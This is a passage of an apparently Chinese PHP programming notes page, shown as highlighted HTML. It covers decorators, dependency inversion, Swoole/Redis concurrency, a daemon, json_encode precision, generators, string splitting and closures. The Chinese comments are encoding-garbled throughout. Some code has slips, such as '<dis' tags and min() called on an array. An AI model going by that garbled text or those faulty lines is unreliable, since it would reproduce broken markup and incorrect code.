class="line"><span class="comment"> * Class EchoText</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoText</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $decorator = [];</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">Index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//è°ƒç”¨è£…é¥°å™¨å‰ç½®æ“ä½œ</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;beforeEcho();</span><br><span class="line">        echo <span class="string">"ä½ å¥½ï¼Œæˆ‘æ˜¯è£…é¥°å™¨ã€‚"</span>;</span><br><span class="line">        <span class="comment">//è°ƒç”¨è£…é¥°å™¨åç½®æ“ä½œ</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;afterEcho();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¢åŠ è£…é¥°å™¨</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">addDecorator</span>(<span class="params">Decorator $decorator</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;decorator[] = $decorator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ‰§è¡Œè£…é¥°å™¨å‰ç½®æ“ä½œ å…ˆè¿›å…ˆå‡ºåŸåˆ™</span></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">beforeEcho</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        foreach ($<span class="keyword">this</span>-&gt;decorator <span class="keyword">as</span> $decorator)</span><br><span class="line">            $decorator-&gt;before();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ‰§è¡Œè£…é¥°å™¨åç½®æ“ä½œ å…ˆè¿›åå‡ºåŸåˆ™</span></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">afterEcho</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tmp = array_reverse($<span class="keyword">this</span>-&gt;decorator);</span><br><span class="line">        foreach ($tmp <span class="keyword">as</span> $decorator)</span><br><span class="line">            $decorator-&gt;after();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è£…é¥°å™¨æ¥å£</span></span><br><span class="line"><span class="comment"> * Class Decorator</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">interface Decorator</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">public</span> <span class="title">function</span> <span class="title">after</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">/**</span></span><br><span class="line"><span class="function"> * é¢œè‰²è£…é¥°å™¨å®ç°</span></span><br><span class="line"><span class="function"> * <span class="title">Class</span> <span class="title">ColorDecorator</span></span></span><br><span class="line"><span class="function"> */</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">ColorDecorator</span> <span class="title">implements</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    protected $color;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$color</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;color = $color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;dis style='color: &#123;$this-&gt;color&#125;'&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">after</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å­—ä½“å¤§å°è£…é¥°å™¨å®ç°</span></span><br><span class="line"><span class="comment"> * Class SizeDecorator</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SizeDecorator</span> <span class="title">implements</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $size;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$size</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;size = $size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;dis style='font-size: &#123;$this-&gt;size&#125;px'&gt;**"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">after</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ä¾‹åŒ–è¾“å‡ºç±»</span></span><br><span class="line">$echo = <span class="keyword">new</span> EchoText();</span><br><span class="line"><span class="comment">//å¢åŠ è£…é¥°å™¨</span></span><br><span class="line">$echo-&gt;addDecorator(<span class="keyword">new</span> ColorDecorator(<span class="string">'red'</span>));</span><br><span class="line"><span class="comment">//å¢åŠ è£…é¥°å™¨</span></span><br><span class="line">$echo-&gt;addDecorator(<span class="keyword">new</span> SizeDecorator(<span class="string">'22'</span>));</span><br><span class="line"><span class="comment">//è¾“å‡º</span></span><br><span class="line">$echo-&gt;Index();</span><br><span class="line">interface employee</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">working</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">teacher</span> <span class="title">implements</span> <span class="title">employee</span>//å…·ä½“åº”è¯¥ä¾èµ–ä¸æŠ½è±¡</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">working</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'teaching...'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">coder</span> <span class="title">implements</span> <span class="title">employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">working</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'coding...'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">workA</span>//ä¾‹å­1</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $teacher = <span class="keyword">new</span> teacher;</span><br><span class="line">        $teacher-&gt;working();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">workB</span>//ä¾‹å­2</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    private $e;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">employee $e</span>)</span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;e = $e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;e-&gt;working();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$worka = <span class="keyword">new</span> workA;<span class="comment">//workA ä¾èµ–äº teacher ç±» ä¸ç¬¦åˆä¾èµ–å€’ç½®åŸåˆ™</span></span><br><span class="line">$worka-&gt;work();</span><br><span class="line">$workb = <span class="keyword">new</span> workB;<span class="comment">//workB ä¸ä¾èµ–ä¸æŸä¸ªç±» æ—¢å¯ä»¥æ³¨å…¥ teacher ä¹Ÿå¯ä»¥ æ³¨å…¥ coder</span></span><br><span class="line">$workb-&gt;set(<span class="keyword">new</span> teacher());</span><br><span class="line">$workb-&gt;work();</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30034#267039</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-å¹¶å‘"><a href="#PHP-å¹¶å‘" class="headerlink" title="PHP å¹¶å‘"></a>PHP å¹¶å‘</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨é˜Ÿåˆ—ï¼Œé¢å¤–èµ·ä¸€ä¸ªè¿›ç¨‹å¤„ç†é˜Ÿåˆ—ï¼Œå¹¶å‘è¯·æ±‚éƒ½æ”¾åˆ°é˜Ÿåˆ—ä¸­ï¼Œç”±é¢å¤–è¿›ç¨‹ä¸²è¡Œå¤„ç†ï¼Œå¹¶å‘é—®é¢˜å°±ä¸å­˜åœ¨äº†ï¼Œä½†æ˜¯è¦é¢å¤–è¿›ç¨‹æ”¯æŒä»¥åŠå¤„ç†å»¶è¿Ÿä¸¥é‡ï¼Œæœ¬æ–‡ä¸å…ˆä¸è®¨è®ºè¿™ç§æ–¹æ³•ã€‚</span><br><span class="line">åˆ©ç”¨æ•°æ®åº“äº‹åŠ¡ç‰¹å¾ï¼ŒåšåŸå­æ›´æ–°ï¼Œæ­¤æ–¹æ³•éœ€è¦ä¾èµ–æ•°æ®åº“çš„äº‹åŠ¡ç‰¹æ€§ã€‚</span><br><span class="line">å€ŸåŠ©æ–‡ä»¶æ’ä»–é”ï¼Œåœ¨å¤„ç†ä¸‹å•è¯·æ±‚çš„æ—¶å€™ï¼Œç”¨ flock é”å®šä¸€ä¸ªæ–‡ä»¶ï¼ŒæˆåŠŸæ‹¿åˆ°é”çš„æ‰èƒ½å¤„ç†è®¢å•</span><br><span class="line">&lt;?php</span><br><span class="line">$http = <span class="keyword">new</span> swoole_http_server(<span class="string">"0.0.0.0"</span>, <span class="number">9509</span>);   <span class="comment">// ç›‘å¬ 9509</span></span><br><span class="line"></span><br><span class="line">$http-&gt;set(array(</span><br><span class="line">    <span class="string">'reactor_num'</span> =&gt; <span class="number">2</span>,  <span class="comment">//reactor thread num</span></span><br><span class="line">    <span class="string">'worker_num'</span> =&gt; <span class="number">4</span>    <span class="comment">//worker process num</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$http-&gt;on(<span class="string">'request'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">swoole_http_request $request, swoole_http_response $response</span>) </span>&#123;</span><br><span class="line">    $uniqid = uniqid(<span class="string">'uid-'</span>, TRUE);    <span class="comment">// æ¨¡æ‹Ÿå”¯ä¸€ç”¨æˆ·ID</span></span><br><span class="line">    $redis = <span class="keyword">new</span> Redis();</span><br><span class="line">    $redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);    <span class="comment">// è¿æ¥ redis</span></span><br><span class="line"></span><br><span class="line">    $redis-&gt;watch(<span class="string">'rest_count'</span>);  <span class="comment">// ç›‘æµ‹ rest_count æ˜¯å¦è¢«å…¶å®ƒçš„è¿›ç¨‹æ›´æ”¹</span></span><br><span class="line"></span><br><span class="line">    $rest_count = intval($redis-&gt;get(<span class="string">"rest_count"</span>));  <span class="comment">// æ¨¡æ‹Ÿå”¯ä¸€è®¢å•ID</span></span><br><span class="line">    <span class="keyword">if</span> ($rest_count &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        $value = <span class="string">"&#123;$rest_count&#125;-&#123;$uniqid&#125;"</span>;  <span class="comment">// è¡¨ç¤ºå½“å‰è®¢å•ï¼Œè¢«å½“å‰ç”¨æˆ·æŠ¢åˆ°äº†</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// do something ... ä¸»è¦æ˜¯æ¨¡æ‹Ÿç”¨æˆ·æŠ¢åˆ°å•åå¯èƒ½è¦è¿›è¡Œçš„ä¸€äº›å¯†é›†è¿ç®—</span></span><br><span class="line">        $rand  = rand(<span class="number">100</span>, <span class="number">1000000</span>);</span><br><span class="line">        $sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $rand; $i++) &#123;$sum += $i;&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// redis äº‹åŠ¡</span></span><br><span class="line">        $redis-&gt;multi();</span><br><span class="line">        $redis-&gt;lPush(<span class="string">'uniqids'</span>, $value);</span><br><span class="line">        $redis-&gt;decr(<span class="string">'rest_count'</span>);</span><br><span class="line">        $replies = $redis-&gt;exec();  <span class="comment">// æ‰§è¡Œä»¥ä¸Š redis äº‹åŠ¡</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// å¦‚æœ rest_count çš„å€¼è¢«å…¶å®ƒçš„å¹¶å‘è¿›ç¨‹æ›´æ”¹äº†ï¼Œä»¥ä¸Šäº‹åŠ¡å°†å›æ»š</span></span><br><span class="line">        <span class="keyword">if</span> (!$replies) &#123;</span><br><span class="line">            echo <span class="string">"è®¢å• &#123;$value&#125; å›æ»š"</span> . PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $redis-&gt;unwatch();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$http-&gt;start();</span><br><span class="line">ä½¿ç”¨ ab æµ‹è¯•https:<span class="comment">//learnku.com/articles/29686</span></span><br><span class="line"></span><br><span class="line">$ ab -t <span class="number">20</span> -c <span class="number">10</span> http:<span class="comment">//192.168.1.104:9509/</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-å®ˆæŠ¤ç¨‹åº"><a href="#PHP-å®ˆæŠ¤ç¨‹åº" class="headerlink" title="PHP å®ˆæŠ¤ç¨‹åº"></a>PHP å®ˆæŠ¤ç¨‹åº</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¼–å†™ä¸€ä¸ªç®€å•daemonç¨‹åºhttps://learnku.com/articles/30595</span></span><br><span class="line">$pid = pcntl_fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>($pid) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: </span><br><span class="line">            <span class="comment">// 2.å­è¿›ç¨‹é€»è¾‘</span></span><br><span class="line">            $mypid = posix_getpid();</span><br><span class="line">            <span class="comment">//echo "Son pid is $mypid\n";</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3.å‡çº§ç»„é•¿è¿›ç¨‹</span></span><br><span class="line">            <span class="keyword">if</span> (!$sid = posix_setsid()) &#123;</span><br><span class="line">                    exit(<span class="string">"Set sid error\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 4.é˜²æ­¢ç»„é•¿è¿›ç¨‹å†æ¬¡æ§åˆ¶ç»ˆç«¯</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">-1</span> == pcntl_fork()) &#123;</span><br><span class="line">                    exit(<span class="string">"Fork error\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 5.æ ‡å‡†è¾“å…¥/è¾“å‡º/é”™è¯¯</span></span><br><span class="line">            fclose(STDIN);</span><br><span class="line">            fclose(STDOUT);</span><br><span class="line">            fclose(STDERR);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 6.æ”¹å˜ç›®å½•</span></span><br><span class="line">            chdir(<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 7.é‡è®¾æ©ç </span></span><br><span class="line">            umask(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            <span class="comment">// fork err</span></span><br><span class="line">            exit(<span class="string">"Fork error\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// 1.çˆ¶è¿›ç¨‹é€»è¾‘</span></span><br><span class="line">            $mypid = posix_getpid();</span><br><span class="line">            <span class="comment">//echo "Parent pid is $mypid\n";</span></span><br><span class="line">            exit();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">10000</span>; $i ++) &#123;</span><br><span class="line">        file_put_contents(<span class="string">"/tmp/wutao.log"</span>, <span class="string">"i=$i\n"</span>, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>
<h3 id="JSON-encode-ç²¾åº¦ç¼ºå¤±"><a href="#JSON-encode-ç²¾åº¦ç¼ºå¤±" class="headerlink" title="JSON_encode () ç²¾åº¦ç¼ºå¤±"></a>JSON_encode () ç²¾åº¦ç¼ºå¤±</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  $info = <span class="number">26.54</span>;</span><br><span class="line">    $res = json_encode($info);</span><br><span class="line">    var_dump($res);</span><br><span class="line">è¿è¡Œç»“æœ</span><br><span class="line"></span><br><span class="line">string(<span class="number">18</span>) <span class="string">"26.539999999999999"</span></span><br><span class="line"></span><br><span class="line">serialize_precision = <span class="number">16</span></span><br><span class="line">&gt;&gt;&gt; ini_get(<span class="string">'serialize_precision'</span>)</span><br><span class="line">=&gt; <span class="string">"17"</span></span><br><span class="line">&gt;&gt;&gt; ini_set(<span class="string">'serialize_precision'</span>,<span class="number">16</span>)</span><br><span class="line">=&gt; <span class="string">"17"</span></span><br><span class="line">&gt;&gt;&gt; json_encode($info);</span><br><span class="line">=&gt; <span class="string">"26.54"</span></span><br></pre></td></tr></table></figure>
<h3 id="ç”Ÿæˆå™¨"><a href="#ç”Ÿæˆå™¨" class="headerlink" title="ç”Ÿæˆå™¨"></a>ç”Ÿæˆå™¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRange</span> (<span class="params">$max = <span class="number">10</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt; $max; $i++) &#123;</span><br><span class="line">        $injected = <span class="keyword">yield</span> $i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($injected === <span class="string">'stop'</span>) <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$generator = getRange(PHP_INT_MAX);</span><br><span class="line">ä¼ é€’å‚æ•°åˆ°ç”Ÿæˆå™¨ä¸­</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach ($generator <span class="keyword">as</span> $range) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($range === <span class="number">10000</span>) &#123;</span><br><span class="line">        $generator-&gt;send(<span class="string">'stop'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo <span class="string">"Dataset &#123;$range&#125; &lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">æ³¨æ„: åœ¨ç”Ÿæˆå™¨ä¸­ä½¿ç”¨ <span class="keyword">return</span> ï¼Œä¼šè·³å‡ºç”Ÿæˆå™¨ã€‚</span><br><span class="line">https:<span class="comment">//learnku.com/php/t/28336</span></span><br></pre></td></tr></table></figure>
<h3 id="å­—ç¬¦ä¸²åˆ†å‰²"><a href="#å­—ç¬¦ä¸²åˆ†å‰²" class="headerlink" title="å­—ç¬¦ä¸²åˆ†å‰²"></a>å­—ç¬¦ä¸²åˆ†å‰²</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$str = <span class="string">'#æœ¬ç§‘ &amp; ç¡•å£« @åšå£« - æ•™æˆ'</span>;</span><br><span class="line">        $limit1 = array(<span class="string">'#'</span>, <span class="string">'&amp;'</span>, <span class="string">'@'</span>, <span class="string">'-'</span>);</span><br><span class="line">        $limit2 = array(<span class="string">'$#$'</span>, <span class="string">'$&amp;$'</span>, <span class="string">'$@$'</span>, <span class="string">'$-$'</span>);</span><br><span class="line">        $str2 = str_replace($limit1, $limit2, $str);</span><br><span class="line">        $arr = array();</span><br><span class="line">        $arr1 = array_values(array_filter(explode(<span class="string">'$'</span>, $str2)));</span><br><span class="line">        foreach ($arr1 <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($k % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                $arr[] = array($v, $arr1[$k + <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        print_r($arr);      https:<span class="comment">//learnku.com/index.php/laravel/t/30777</span></span><br><span class="line">      $string = <span class="string">'#æœ¬ç§‘ &amp; ç¡•å£« @åšå£« - æ•™æˆ'</span>;</span><br><span class="line">      $matches = [];</span><br><span class="line">      preg_match_all(<span class="string">'/([#|&amp;|@|\-])([^#|&amp;|@|\-]*)/'</span>, $string, $matches);</span><br><span class="line">      </span><br><span class="line">      $signArr = array_map(<span class="string">'trim'</span>, $matches[<span class="number">1</span>]);</span><br><span class="line">      $titleArr = array_map(<span class="string">'trim'</span>, $matches[<span class="number">2</span>]);</span><br><span class="line">      # åœ¨è¿™ä»¥ä¸‹çš„ä»£ç ä½ å¯ä»¥è‡ªç”±å‘æŒ¥äº†</span><br><span class="line">      $data = [];</span><br><span class="line">      $minCount = min(count($signArr), $titleArr);</span><br><span class="line">      <span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;$minCount; $i++)</span><br><span class="line">      &#123;</span><br><span class="line">          $data[] = [</span><br><span class="line">              $signArr[$i],</span><br><span class="line">              $titleArr[$i],</span><br><span class="line">          ];</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<h3 id="é—­åŒ…å’ŒåŒ¿åå‡½æ•°"><a href="#é—­åŒ…å’ŒåŒ¿åå‡½æ•°" class="headerlink" title="é—­åŒ…å’ŒåŒ¿åå‡½æ•°"></a>é—­åŒ…å’ŒåŒ¿åå‡½æ•°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callFunc1</span>(<span class="params">Closure $closure</span>) </span>&#123;</span><br><span class="line">    $closure();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callFunc2</span>(<span class="params">Callable $callback</span>) </span>&#123;</span><br><span class="line">    $callback();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xy</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    echo <span class="string">'Hello, World!'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$<span class="function"><span class="keyword">function</span> = <span class="title">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    echo <span class="string">'Hello, World!'</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">callFunc1(<span class="string">"xy"</span>); <span class="comment">// Catchable fatal error: Argument 1 passed to callFunc1() must be an instance of Closure, string given</span></span><br><span class="line">callFunc2(<span class="string">"xy"</span>); <span class="comment">// Hello, World!</span></span><br><span class="line"></span><br><span class="line">callFunc1($<span class="function"><span class="keyword">function</span>); // <span class="title">Hello</span>, <span class="title">World</span>!</span></span><br><span class="line"><span class="function"><span class="title">callFunc2</span>(<span class="params">$function</span>); // <span class="title">Hello</span>, <span class="title">World</span>!</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//ä»<span class="title">php7</span>.1å¼€å§‹å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç è½¬æ¢</span></span><br><span class="line"><span class="function"><span class="title">callFunc1</span>(<span class="params">Closure::fromCallable(<span class="string">"xy"</span></span>))</span></span><br><span class="line"><span class="function">å…¶ä¸­ <span class="title">callable</span> å‚æ•°å¯ä»¥ä¸º</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">is_callable</span>(<span 